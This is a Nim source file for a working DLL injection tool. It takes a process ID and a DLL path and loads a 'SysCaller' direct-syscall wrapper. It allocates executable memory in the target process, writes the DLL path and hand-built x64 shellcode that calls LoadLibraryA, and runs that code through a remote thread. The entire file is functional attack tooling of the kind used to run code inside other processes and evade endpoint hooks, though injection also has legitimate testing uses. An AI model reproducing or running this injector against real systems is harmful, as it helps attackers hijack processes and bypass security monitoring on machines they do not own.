import winim/lean, os, strutils, dynlib

type
  NTSTATUS = int32
  SIZE_T = uint64
  ULONG = uint32

# Function pointer types
type
  SysAllocateVirtualMemoryExProc = proc(
    processHandle: HANDLE,
    baseAddress: ptr pointer,
    regionSize: ptr SIZE_T,
    allocationType: ULONG,
    protect: ULONG,
    extendedParams: pointer,
    paramCount: ULONG
  ): NTSTATUS {.stdcall.}

  SysWriteVirtualMemoryProc = proc(
    processHandle: HANDLE,
    baseAddress: pointer,
    buffer: pointer,
    bufferSize: SIZE_T,
    bytesWritten: ptr SIZE_T
  ): NTSTATUS {.stdcall.}

  SysCreateThreadExProc = proc(
    threadHandle: ptr HANDLE,
    desiredAccess: ULONG,
    objectAttributes: pointer,
    processHandle: HANDLE,
    startRoutine: pointer,
    argument: pointer,
    createFlags: ULONG,
    zeroBits: SIZE_T,
    stackSize: SIZE_T,
    maxStackSize: SIZE_T,
    attributeList: pointer
  ): NTSTATUS {.stdcall.}

  SysCloseProc = proc(handle: HANDLE): NTSTATUS {.stdcall.}

proc ntSuccess(status: NTSTATUS): bool =
  status >= 0

proc injectDLL(
  processHandle: HANDLE,
  dllPath: string,
  SysAllocateVirtualMemoryEx: SysAllocateVirtualMemoryExProc,
  SysWriteVirtualMemory: SysWriteVirtualMemoryProc,
  SysCreateThreadEx: SysCreateThreadExProc,
  SysClose: SysCloseProc
): bool =
  let absPath = dllPath.absolutePath
  let dllPathBytes = absPath & '\0'
  let pathSize = dllPathBytes.len
  var baseAddress: pointer = nil
  var regionSize: SIZE_T = SIZE_T(pathSize)
  var status = SysAllocateVirtualMemoryEx(
    processHandle,
    addr baseAddress,
    addr regionSize,
    0x3000, # MEM_COMMIT | MEM_RESERVE
    0x40,   # PAGE_EXECUTE_READWRITE
    nil,
    0
  )
  if not ntSuccess(status):
    echo "[!] Failed to allocate memory for DLL path. Status: 0x", status.toHex
    return false
  echo "[+] Allocated DLL path memory at: 0x", cast[uint64](baseAddress).toHex
  var bytesWritten: SIZE_T = 0
  status = SysWriteVirtualMemory(
    processHandle,
    baseAddress,
    cast[pointer](dllPathBytes.cstring),
    pathSize.SIZE_T,
    addr bytesWritten
  )
  if not ntSuccess(status) or bytesWritten != pathSize.SIZE_T:
    echo "[!] Failed to write DLL path. Status: 0x", status.toHex, ", Bytes written: ", bytesWritten
    return false
  echo "[+] Successfully wrote DLL path to memory"
  # Get LoadLibraryA address
  let hKernel32 = GetModuleHandleA("kernel32.dll")
  if hKernel32 == 0:
    echo "[!] Failed to get kernel32.dll handle"
    return false
  let loadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA")
  if loadLibraryA == nil:
    echo "[!] Failed to get LoadLibraryA address"
    return false
  echo "[+] LoadLibraryA address: 0x", cast[uint64](loadLibraryA).toHex
  # Build x64 shellcode
  var shellcode: seq[byte] = @[
    0x48'u8, 0x83, 0xEC, 0x28,             # sub rsp, 0x28
    0x48, 0xB9                            # mov rcx,
  ]
  shellcode.add(cast[array[8, byte]](cast[uint64](baseAddress)))
  shellcode.add(@[0x48'u8, 0xB8])         # mov rax,
  shellcode.add(cast[array[8, byte]](cast[uint64](loadLibraryA)))
  shellcode.add(@[
    0xFF'u8, 0xD0,                        # call rax
    0x48, 0x83, 0xC4, 0x28,               # add rsp, 0x28
    0xC3                                  # ret
  ])
  let shellcodeSize = shellcode.len
  var shellcodeAddr: pointer = nil
  regionSize = shellcodeSize.SIZE_T
  status = SysAllocateVirtualMemoryEx(
    processHandle,
    addr shellcodeAddr,
    addr regionSize,
    0x3000,
    0x40,
    nil,
    0
  )
  if not ntSuccess(status):
    echo "[!] Failed to allocate memory for shellcode. Status: 0x", status.toHex
    return false
  echo "[+] Allocated shellcode memory at: 0x", cast[uint64](shellcodeAddr).toHex
  bytesWritten = 0
  status = SysWriteVirtualMemory(
    processHandle,
    shellcodeAddr,
    unsafeAddr shellcode[0],
    shellcodeSize.SIZE_T,
    addr bytesWritten
  )
  if not ntSuccess(status) or bytesWritten != shellcodeSize.SIZE_T:
    echo "[!] Failed to write shellcode. Status: 0x", status.toHex, ", Bytes written: ", bytesWritten
    return false
  echo "[+] Successfully wrote shellcode"
  var threadHandle: HANDLE = 0
  status = SysCreateThreadEx(
    addr threadHandle,
    0x1FFFFF, # THREAD_ALL_ACCESS
    nil,
    processHandle,
    shellcodeAddr,
    nil,
    0, 0, 0, 0,
    nil
  )
  if not ntSuccess(status) or threadHandle == 0:
    echo "[!] Failed to create remote thread. Status: 0x", status.toHex, ", Handle: 0x", threadHandle
    return false
  echo "[+] Created remote thread: 0x", threadHandle
  discard WaitForSingleObject(threadHandle, 5000)
  discard SysClose(threadHandle)
  echo "[+] Successfully injected ", dllPath, "!"
  return true

when isMainModule:
  if paramCount() != 2:
    echo "Usage: ", paramStr(0), " <pid> <dll_path>"
    quit(1)
  let pid = paramStr(1).parseInt.uint32
  let dllPath = paramStr(2)
  let PROCESS_ALL_ACCESS = 0x1F0FFF'u32
  let hSysCaller = loadLib("SysCaller.dll")
  if hSysCaller == nil:
    echo "[!] Failed to load SysCaller.dll"
    quit(1)
  let SysAllocateVirtualMemoryEx = cast[SysAllocateVirtualMemoryExProc](hSysCaller.symAddr("SysAllocateVirtualMemoryEx"))
  let SysWriteVirtualMemory = cast[SysWriteVirtualMemoryProc](hSysCaller.symAddr("SysWriteVirtualMemory"))
  let SysCreateThreadEx = cast[SysCreateThreadExProc](hSysCaller.symAddr("SysCreateThreadEx"))
  let SysClose = cast[SysCloseProc](hSysCaller.symAddr("SysClose"))
  if SysAllocateVirtualMemoryEx == nil or SysWriteVirtualMemory == nil or SysCreateThreadEx == nil or SysClose == nil:
    echo "[!] Failed to resolve SysCaller functions"
    quit(1)
  let hProcess = OpenProcess(DWORD(PROCESS_ALL_ACCESS), WINBOOL(0), DWORD(pid))
  if hProcess == 0:
    echo "[!] Failed to open process ", pid
    quit(1)
  discard injectDLL(hProcess, dllPath, SysAllocateVirtualMemoryEx, SysWriteVirtualMemory, SysCreateThreadEx, SysClose)
  discard CloseHandle(hProcess)
